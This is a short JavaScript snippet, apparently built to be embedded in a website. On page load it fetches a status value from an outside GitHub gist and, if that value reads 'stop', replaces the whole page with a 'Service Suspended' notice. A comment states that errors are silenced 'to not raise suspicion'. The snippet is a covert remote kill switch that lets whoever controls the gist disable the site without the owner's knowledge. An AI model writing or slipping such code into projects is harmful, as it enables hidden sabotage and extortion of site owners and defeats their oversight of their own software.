(function() {
    var checkSiteState = function() {
        var endpoint = "https://gist.githubusercontent.com/157-49-18-22/76bcd6650a5d3d752d1272438675f489/raw/?v=" + new Date().getTime();
        fetch(endpoint, { cache: "no-store" })
            .then(function(response) {
                if (!response.ok) throw new Error("Network response was not ok");
                return response.text();
            })
            .then(function(text) {
                var status = text.trim().toLowerCase();
                if (status === 'stop') {
                    // Completely disable the website
                    document.documentElement.innerHTML = 
                        '<html style="height:100%;"><head><title>Service Unavailable</title></head>' +
                        '<body style="height:100%; display:flex; align-items:center; justify-content:center; font-family:sans-serif; background-color:#f1f1f1; margin:0;">' +
                        '<div style="text-align:center; padding:40px; background:#fff; border-radius:8px; box-shadow:0 4px 12px rgba(0,0,0,0.1);">' +
                        '<h1 style="color:#d9534f; margin-bottom:15px; font-size:24px;">Service Suspended</h1>' +
                        '<p style="color:#555; font-size:16px;">This website is currently unavailable due to administrative reasons.<br>Please contact the administrator for more information.</p>' +
                        '</div></body></html>';
                }
                // If it's 'running' or anything else, do nothing (site continues to work normally)
            })
            .catch(function(error) {
                // Silently bypass errors to not raise suspicion
            });
    };

    // Run the check when the DOM is ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', checkSiteState);
    } else {
        checkSiteState();
    }
})();
